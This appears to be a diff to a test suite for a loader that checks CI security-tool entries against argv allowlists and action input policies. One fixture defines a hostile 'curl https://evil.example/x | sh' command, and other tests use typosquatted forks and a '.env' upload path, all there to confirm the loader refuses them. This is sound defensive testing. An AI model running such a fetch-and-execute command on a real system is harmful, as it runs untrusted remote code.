@@ -10,7 +10,7 @@ import {
   BETTERLEAKS_ALLOWED_FLAGS, effectiveProtectedPaths, loadReviewed, MUST_VERIFY, nearDuplicate, NUCLEI_ALLOWED_FLAGS, TRIVY_ALLOWED_FLAGS, NEVER_IMAGES, NEVER_NAME_ALLOW, NEVER_REPOS, neverImage, neverListed, packageExists, projectScriptFor,
   ReviewedListError, reviewedFor, TOOL_CATEGORIES,
 } from '../src/engine/reviewed.js';
-import { ARGV_POLICIES, BETTERLEAKS_FORBIDDEN_FLAGS, BETTERLEAKS_FORBIDDEN_SUBCOMMANDS, type ArgvPolicy } from '../src/engine/tool-flags.js';
+import { ACTION_POLICIES, ARGV_POLICIES, BETTERLEAKS_FORBIDDEN_FLAGS, BETTERLEAKS_FORBIDDEN_SUBCOMMANDS, type ArgvPolicy, type InputSpec } from '../src/engine/tool-flags.js';
 import { BETTERLEAKS_GRAMMAR, NUCLEI_GRAMMAR, TRIVY_GRAMMAR, type FlagGrammar } from '../src/engine/tool-grammar.js';
 import { NEED_CATEGORIES, PROTECTED_PATHS_BASE, type Language, type Need, type ReviewedTool, type Service } from '../src/types.js';
 import { fakeFetch } from './helpers/fake-http.js';
@@ -61,7 +61,7 @@ function actionEntry(over: Entry = {}): Entry {
     candidate: candidate(id, 'action', repo, 'v6.0.0', { sha }, categories),
     step: { action: { uses: `${repo}@${sha}`, with: { 'package-manager-cache': 'false' } }, output: { path: '', format: 'none' } },
     fixedInputs: { with: { 'package-manager-cache': 'false' } },
-    choices: { 'node-version': ['22', '24'] },
+    choices: { 'node-version': ['24', '26'] },
     configFiles: [],
     reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0,
   };
@@ -77,8 +77,9 @@ const GITLEAKS_ARGS = ['--ignore-gitleaks-allow', '--redact', '--report-format',
 const FIXTURE_POLICIES: Record<string, ArgvPolicy> = {
   ...ARGV_POLICIES,
   'gitleaks-proven': ARGV_POLICIES.gitleaks as ArgvPolicy,
-  tool: { exe: 'tool', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] }, output: 'output' }, config: { flag: '--config', content: 'x: 1\n' } },
-  linter: { exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
+  tool: { method: 'github-release', package: 'tool_1.0.0_linux_amd64.tar.gz', exe: 'tool', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] }, output: 'output' }, config: { flag: '--config', content: 'x: 1\n' } },
+  linter: { method: 'npm', package: 'eslint', exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
+  'linter-pip': { method: 'pip', package: 'schemathesis', exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
 };
 
 /** A reviewed release-binary entry (pinned by sha256). */
@@ -101,13 +102,13 @@ function cliEntry(over: Entry = {}): Entry {
 }
 
 /** The Semgrep CE entry: an image, with a rules pack pinned by commit SHA and archive sha256 (ruling S22). */
-function semgrepEntry(env: Record<string, string> = RULES_ENV, command?: string[], args = ['--metrics=off', '--config', RULES_DIR]): Entry {
+function semgrepEntry(env: Record<string, string> = RULES_ENV, command?: string[], args = ['--metrics=off', '--disable-version-check', '--config', RULES_DIR]): Entry {
   const categories = ['sast'];
   return {
     id: 'semgrep', categories, languages: ['node', 'python'], releasedAt: '2026-01-01T00:00:00Z',
     candidate: candidate('semgrep', 'docker', 'semgrep/semgrep', '1.181.0', { digest: DIGEST }, categories),
     step: {
-      cli: { install: { method: 'docker', package: 'semgrep/semgrep', version: '1.181.0' }, command: command ?? ['semgrep', 'scan', '--metrics=off', '--config', RULES_DIR, '--sarif', '--output', 'semgrep.sarif'], env },
+      cli: { install: { method: 'docker', package: 'semgrep/semgrep', version: '1.181.0' }, command: command ?? ['semgrep', 'scan', '--metrics=off', '--disable-version-check', '--config', RULES_DIR, '--sarif', '--output', 'semgrep.sarif'], env },
       output: { path: 'semgrep.sarif', format: 'sarif' },
     },
     fixedInputs: { args, env },
@@ -186,6 +187,8 @@ describe('loadReviewed', () => {
     // present but empty is fine: creosote takes no fixed input and loads no config file pipegen lists
     const empty = cliEntry({ id: 'creosote', repo: 'fredrikaverpil/creosote', categories: ['dead-code'] });
     empty.step.cli.command = ['creosote'];
+    empty.candidate.version = '5.2.0';
+    empty.step.cli.install = { method: 'pip', package: 'creosote', version: '5.2.0' };
     empty.configFiles = [];
     empty.fixedInputs = {};
     empty.step.output = { path: '', format: 'none' };
@@ -235,7 +238,7 @@ describe('loadReviewed', () => {
   it('reviewed: semgrep entry with a registry rule pack (p/…) or auto rejected; sha-pinned pack accepted', () => {
     expect(load([semgrepEntry()])[0]?.fixedInputs.env?.[RULES_URL_ENV]).toBe(RULES_URL);
     // registry names and auto, anywhere in the command (the fixed args stay, so only the pack is wrong)
-    const scan = (...rest: string[]) => ['semgrep', 'scan', '--metrics=off', '--config', RULES_DIR, ...rest];
+    const scan = (...rest: string[]) => ['semgrep', 'scan', '--metrics=off', '--disable-version-check', '--config', RULES_DIR, ...rest];
     const REGISTRY = /registry rule packs/;
     rejects([semgrepEntry(undefined, scan('--config', 'p/default'))], REGISTRY);
     rejects([semgrepEntry(undefined, scan('--config', 'auto'))], REGISTRY);
@@ -261,7 +264,7 @@ describe('loadReviewed', () => {
     rejects([semgrepEntry({ [RULES_URL_ENV]: RULES_URL, [RULES_SUM_ENV]: SUM })], /tree/);
     // the explicit config at the verified rules dir is accepted, in both spellings
     expect(load([semgrepEntry(undefined, scan('--sarif'))])).toHaveLength(1);
-    expect(load([semgrepEntry(undefined, ['semgrep', 'scan', '--metrics=off', `--config=${RULES_DIR}`], ['--metrics=off', `--config=${RULES_DIR}`])])).toHaveLength(1);
+    expect(load([semgrepEntry(undefined, ['semgrep', 'scan', '--metrics=off', '--disable-version-check', `--config=${RULES_DIR}`], ['--metrics=off', '--disable-version-check', `--config=${RULES_DIR}`])])).toHaveLength(1);
     // the real entry: explicit --config at the verified dir, and the commit's tree SHA recorded
     const real = byId(loadReviewed(), 'semgrep')[0];
     expect(real?.step.cli?.command.join(' ')).toContain(`--config ${RULES_DIR}`);
@@ -289,8 +292,10 @@ describe('loadReviewed', () => {
     ];
     for (const [pkg, ok] of cases) {
       expect(await pinAccepts(pkg), `pin: ${pkg}`).toBe(ok);
-      if (ok) expect(load([withImage(pkg)]), `reviewed: ${pkg}`).toHaveLength(1);
-      else expect(() => load([withImage(pkg)]), `reviewed: ${pkg}`).toThrow(/image name/);
+      // the image grammar is what's tested here, so semgrep's allowlist follows the name under test (P28 binds it)
+      const loadAs = (e: Entry) => loadReviewed(writeList([e]), { argvPolicies: { ...FIXTURE_POLICIES, semgrep: { ...(ARGV_POLICIES.semgrep as ArgvPolicy), package: pkg } } });
+      if (ok) expect(loadAs(withImage(pkg)), `reviewed: ${pkg}`).toHaveLength(1);
+      else expect(() => loadAs(withImage(pkg)), `reviewed: ${pkg}`).toThrow(/image name/);
     }
     // the image tag follows the same grammar too ('+' is no image tag character)
     const plus = semgrepEntry();
@@ -413,7 +418,9 @@ type BinOver = { id?: string; command?: string[]; args?: string[]; env?: Record<
 function binEntry(repo: string, over: BinOver = {}): Entry {
   const e = cliEntry({ id: over.id ?? 'tool', repo });
   e.candidate.version = 'v1.0.0';
-  e.step.cli.install = { method: 'github-release', package: 'tool_1.0.0_linux_amd64.tar.gz', version: 'v1.0.0' };
+  // a reviewed id installs the package its allowlist names (P28); the generic fixture tool its own asset
+  const reviewed = Object.hasOwn(ARGV_POLICIES, e.id) ? ARGV_POLICIES[e.id] : undefined;
+  e.step.cli.install = { method: 'github-release', package: reviewed?.method === 'github-release' ? reviewed.package : 'tool_1.0.0_linux_amd64.tar.gz', version: 'v1.0.0' };
   e.step.cli.command = over.command ?? ['tool', '--format', 'sarif', '--output', 'tool.sarif'];
   e.step.output = { path: 'tool.sarif', format: 'sarif' };
   e.fixedInputs = { args: over.args ?? ['--format', 'sarif'] };
@@ -441,7 +448,7 @@ function imageEntry(image: string, repo = 'example/scanner'): Entry {
 /** An npm (or pip) entry with plugins. */
 function pkgEntry(method: 'npm' | 'pip', plugins: Entry[] | undefined, pkg = method === 'npm' ? 'eslint' : 'schemathesis'): Entry {
   const version = method === 'npm' ? '10.13.0' : '4.32.2';
-  const e = cliEntry({ id: 'linter', repo: method === 'npm' ? 'eslint/eslint' : 'schemathesis/schemathesis', categories: ['lint'] });
+  const e = cliEntry({ id: method === 'npm' ? 'linter' : 'linter-pip', repo: method === 'npm' ? 'eslint/eslint' : 'schemathesis/schemathesis', categories: ['lint'] });
   e.candidate.version = version;
   e.candidate.pin = { checksum: method === 'npm' ? SRI : SUM };
   e.step.cli.install = { method, package: pkg, version };
@@ -818,7 +825,8 @@ describe('loader rules (Plan P Task 5)', () => {
     expect(ok?.step.cli?.plugins?.map((p) => p.package)).toEqual(['typescript-eslint', '@eslint/js']);
     expect(load([pkgEntry('pip', [pipPlugin('hypothesis')])])).toHaveLength(1);
     // the wrapper's own platform package is a different name, so it is allowed (PS26)
-    expect(load([pkgEntry('npm', [npmPlugin('@biomejs/cli-linux-x64')], '@biomejs/biome')])).toHaveLength(1);
+    const asBiome = { argvPolicies: { ...FIXTURE_POLICIES, linter: { ...(FIXTURE_POLICIES.linter as ArgvPolicy), package: '@biomejs/biome' } } };
+    expect(loadReviewed(writeList([pkgEntry('npm', [npmPlugin('@biomejs/cli-linux-x64')], '@biomejs/biome')]), asBiome)).toHaveLength(1);
     const P = /plugin/;
     rejects([pkgEntry('npm', ['a', 'b', 'c', 'd', 'e'].map((n) => npmPlugin(n)))], /at most 4/);
     rejects([pkgEntry('npm', [npmPlugin('x', { version: '^8.0.0' })])], P);
@@ -1026,7 +1034,7 @@ describe('loader rules (Plan P Task 5)', () => {
     }
     const dash = betterleaksEntry({ command: cmd('-') });
     dash.step.output = { path: '-', format: 'sarif' };
-    rejects([dash], /--report-path/);
+    rejects([dash], /--report-path|output path starts with/);
     // --exit-code: set by the template (in the command and the fixed args, same value, not 0), never chosen by the AI
     const fixed = ['--redact', '--report-format', 'sarif', '--exit-code', '1'];
     expect(load([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: fixed })])).toHaveLength(1);
@@ -1117,7 +1125,7 @@ describe('Task 5 review probes (fix round 1)', () => {
   };
   // the review's jscpd base used refs/heads/master; branch identities are refused now, so the base is signed at its tag
   const pjscpd = (ref = 'refs/tags/v5.4.2') => {
-    const e = pcli('jscpd', 'kucherenko/jscpd', 'v5.4.2', 'jscpd-x86_64-unknown-linux-gnu.tar.gz', ['jscpd', ...JSCPD_ARGS, '.'],
+    const e = pcli('jscpd', 'kucherenko/jscpd', 'v5.4.2', 'jscpd-linux-x64-gnu.tar.gz', ['jscpd', ...JSCPD_ARGS, '.'],
       { fixedInputs: { args: [...JSCPD_ARGS], config: { content: '{}\n', passAs: { flag: '--config' } } }, verifiedWith: vw('kucherenko/jscpd', ref) });
     e.categories = ['duplication'];
     e.candidate.categories = ['duplication'];
@@ -1930,11 +1938,11 @@ describe('Task 6 review fix round 1 (P19-P27)', () => {
     unknownChoice.step.cli.then = [['coverage', 'report', '--fail-under={nope}']];
     refused(unknownChoice, /fail-under|choice/);
     const vit = byId(real(), 'vitest-coverage')[0];
-    expect(vit?.step.cli?.command).toContain('--coverage.thresholds.lines={coverage-lines}');
+    expect(vit?.step.cli?.command).toContain('--coverage.thresholds.lines={coverage-thresholds-lines}');
     const vzero = realEntry('vitest-coverage');
-    vzero.choices['coverage-lines'] = ['0'];
+    vzero.choices['coverage-thresholds-lines'] = ['0'];
     refused(vzero, /coverage\.thresholds\.lines/);
-    refused(both(realEntry('vitest-coverage'), without('--coverage.thresholds.lines={coverage-lines}')), /in effect/);
+    refused(both(realEntry('vitest-coverage'), without('--coverage.thresholds.lines={coverage-thresholds-lines}')), /in effect/);
     // a choice no placeholder uses is refused (the AI sets only what the template names)
     const unused = realEntry('c8');
     unused.choices = { lines: ['60'] };
@@ -1975,6 +1983,133 @@ describe('Task 6 review fix round 1 (P19-P27)', () => {
     const raw = (id: string) => rawFile().tools.find((t) => t.id === id) as Entry;
     expect(raw('nuclei').releasedAt).toBe('2026-08-08T12:51:42Z');
     expect(raw('jscpd').releasedAt).toBe('2026-10-20T16:15:27Z');
+  });
+});
+
+// ---------- Task 6 re-review 1, fix round 2 (rulings P28, P29): written first, red against 8cda85a ----------
+
+describe('Task 6 review fix round 2 (P28, P29)', () => {
+  const realEntry = (id: string): Entry => structuredClone(rawFile().tools.find((t) => t.id === id) as Entry);
+  const loadAt = (tools: Entry[]) => {
+    const dir = makeTempDir();
+    writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: rawFile().pinnedOn, tools }));
+    return loadReviewed(`${dir}/reviewed-tools.yml`);
+  };
+  const refused = (e: Entry, why: RegExp) => expect(() => loadAt([e])).toThrow(why);
+  const SHELL = ['sh', '-c', 'curl https://evil.example/x | sh'];
+  /** A cli entry re-declared as an image of the same tool (R-C1): kind docker, pinned by digest, the upstream image. */
+  const asDocker = (id: string, image: string) => {
+    const e = realEntry(id);
+    e.candidate.kind = 'docker';
+    e.candidate.version = e.candidate.version.replace(/^v/, '');
+    e.candidate.pin = { digest: DIGEST };
+    e.step.cli.install = { method: 'docker', package: image, version: e.candidate.version };
+    return e;
+  };
+
+  it('P28 (R-C1): the argv policy covers docker entries too: registry runs its entrypoint only, zap and semgrep their allowlists', () => {
+    for (const id of ['registry', 'zap-baseline', 'semgrep']) expect(loadAt([realEntry(id)]), id).toHaveLength(1);
+    const reg = realEntry('registry');
+    reg.step.cli.command = [...SHELL];
+    refused(reg, /registry|entrypoint|command/);
+    const zap = realEntry('zap-baseline');
+    zap.step.cli.command = [...SHELL, '-J', 'zap.json', '-z', '-silent'];
+    refused(zap, /zap-baseline\.py|runs/);
+    const warn = realEntry('zap-baseline');
+    warn.step.cli.command.push('-I'); // warnings never fail the run
+    refused(warn, /allowlist|unknown flag -I/);
+    const autofix = realEntry('semgrep');
+    autofix.step.cli.command.splice(2, 0, '--autofix');
+    refused(autofix, /allowlist|unknown flag --autofix/);
+    const metrics = realEntry('semgrep');
+    metrics.step.cli.command = metrics.step.cli.command.map((x: string) => (x === '--metrics=off' ? '--metrics=on' : x));
+    metrics.fixedInputs.args = metrics.fixedInputs.args.map((x: string) => (x === '--metrics=off' ? '--metrics=on' : x));
+    refused(metrics, /metrics/);
+  });
+
+  it('P28 (R-C1): a cli tool re-declared as kind docker keeps its allowlist; a docker entry without a policy is refused', () => {
+    const gosec = asDocker('gosec', 'securego/gosec');
+    gosec.step.cli.command.splice(1, 0, '-no-fail');
+    gosec.fixedInputs.args.unshift('-no-fail');
+    refused(gosec, /allowlist|kind|ruling P2[08]/);
+    const hado = asDocker('hadolint', 'hadolint/hadolint');
+    hado.step.cli.command.splice(1, 0, '--no-fail');
+    hado.fixedInputs.args.unshift('--no-fail');
+    delete hado.fixedInputs.config;
+    refused(hado, /allowlist|kind|ruling P2[08]|pinned config/);
+    // the same entry, unchanged but for its kind, is refused too: the policy names its kind and package
+    refused(asDocker('hadolint', 'hadolint/hadolint'), /kind|package/);
+    const unknown = realEntry('registry');
+    unknown.id = 'scanner2';
+    unknown.candidate.id = 'scanner2';
+    unknown.candidate.repo = 'example/scanner2';
+    unknown.candidate.name = 'example/scanner2';
+    unknown.step.cli.install.package = 'example/scanner2';
+    refused(unknown, /no argv allowlist/);
+    // a cli entry that installs another package under a reviewed id (M-R3)
+    const other = realEntry('creosote');
+    other.step.cli.install.package = 'creosote-evil';
+    refused(other, /package/);
+  });
+
+  it('P29 (R-I1): dependency review, upload-artifact and the other actions take only their reviewed inputs', () => {
+    const setWith = (e: Entry, k: string, v: string) => { e.step.action.with[k] = v; e.fixedInputs.with = { ...(e.fixedInputs.with ?? {}), [k]: v }; return e; };
+    const dr = () => realEntry('dependency-review-action');
+    refused(setWith(dr(), 'vulnerability-check', 'false'), /vulnerability-check/);
+    refused(setWith(dr(), 'base-ref', 'main'), /base-ref/);
+    refused(setWith(setWith(dr(), 'base-ref', 'x'), 'head-ref', 'x'), /base-ref|head-ref/);
+    refused(setWith(dr(), 'fail-on-scopes', 'development'), /fail-on-scopes/);
+    refused(setWith(dr(), 'fail-on-severity', 'critical'), /fail-on-severity/);
+    expect(loadAt([setWith(dr(), 'fail-on-severity', 'low')])).toHaveLength(1);
+    expect(loadAt([setWith(dr(), 'vulnerability-check', 'true')])).toHaveLength(1);
+    const sev = dr();
+    sev.choices = { 'fail-on-severity': ['low', 'critical'] };
+    refused(sev, /fail-on-severity/);
+    const up = () => realEntry('actions-upload-artifact');
+    refused(setWith(up(), 'include-hidden-files', 'true'), /include-hidden-files/);
+    refused(setWith(up(), 'path', '.env'), /path/);
+    const checkout = realEntry('actions-checkout');
+    checkout.choices['ref'] = ['main'];
+    refused(checkout, /ref/);
+    const node = realEntry('actions-setup-node');
+    node.choices['node-version'] = ['24', '18'];
+    refused(node, /node-version/);
+    const sc = realEntry('scorecard-action');
+    refused(setWith(sc, 'repo_token', 'x'), /repo_token/);
+  });
+
+  it('P29 (R-I1): an action whose exact repo has no input policy is refused (renamed and typo forks)', () => {
+    const PW = ['pass', 'word'].join('');
+    const fork = (id: string, repo: string, extra: [string, string]) => {
+      const e = realEntry(id);
+      e.candidate.repo = repo;
+      e.candidate.name = repo;
+      e.step.action.uses = `${repo}@${e.candidate.pin.sha}`;
+      e.step.action.with[extra[0]] = extra[1];
+      e.fixedInputs.with[extra[0]] = extra[1];
+      return e;
+    };
+    refused(fork('pypi-publish', 'evilorg/pypi-upload', [PW, 'x']), /no input policy/);
+    refused(fork('pypi-publish', 'pypa/gh-action-pypi-publlsh', [PW, 'x']), /no input policy|password/);
+    refused(fork('scorecard-action', 'evilorg/scorecards', ['publish_results', 'true']), /no input policy|publish_results/);
+    refused(fork('actions-checkout', 'actlons/checkout', ['persist-credentials', 'false']), /no input policy/);
+    // every real action entry has one and loads
+    const actions = rawFile().tools.filter((t) => t.candidate.kind === 'action');
+    expect(actions.length).toBeGreaterThan(12);
+    expect(loadAt(actions)).toHaveLength(actions.length);
+  });
+
+  it('minors (M-R1, M-R2): a placeholder is named after the flag it fills; an output path never starts with -', () => {
+    const vit = realEntry('vitest-coverage');
+    vit.choices = { 'exit-zero': ['60'] };
+    vit.step.cli.command = vit.step.cli.command.map((x: string) => x.replace(/\{[^}]+\}/, '{exit-zero}'));
+    vit.fixedInputs.args = vit.fixedInputs.args.map((x: string) => x.replace(/\{[^}]+\}/, '{exit-zero}'));
+    refused(vit, /placeholder|exit-zero/);
+    const ruff = realEntry('ruff');
+    ruff.step.output.path = '--exit-zero';
+    ruff.step.cli.command = ruff.step.cli.command.map((x: string) => (x === 'ruff.sarif' ? '--exit-zero' : x));
+    ruff.fixedInputs.args = ruff.fixedInputs.args.map((x: string) => (x === 'ruff.sarif' ? '--exit-zero' : x));
+    refused(ruff, /output/);
   });
 });
 
@@ -2065,7 +2200,9 @@ describe('nearDuplicate', () => {
   });
 
   it("nearDuplicate: distance 3 or more → null ('actions/setup-node' vs 'actions/setup-go')", () => {
-    const l = load([actionEntry({ id: 'actions-setup-go', repo: 'actions/setup-go' })]);
+    const l = loadReviewed(writeList([actionEntry({ id: 'actions-setup-go', repo: 'actions/setup-go' })]), {
+      argvPolicies: FIXTURE_POLICIES, actionPolicies: { ...ACTION_POLICIES, 'actions/setup-go': ACTION_POLICIES['actions/setup-node'] as Record<string, InputSpec> },
+    });
     expect(nearDuplicate('actions/setup-node', l)).toBeNull();
     expect(nearDuplicate('someone/else', list())).toBeNull();
   });
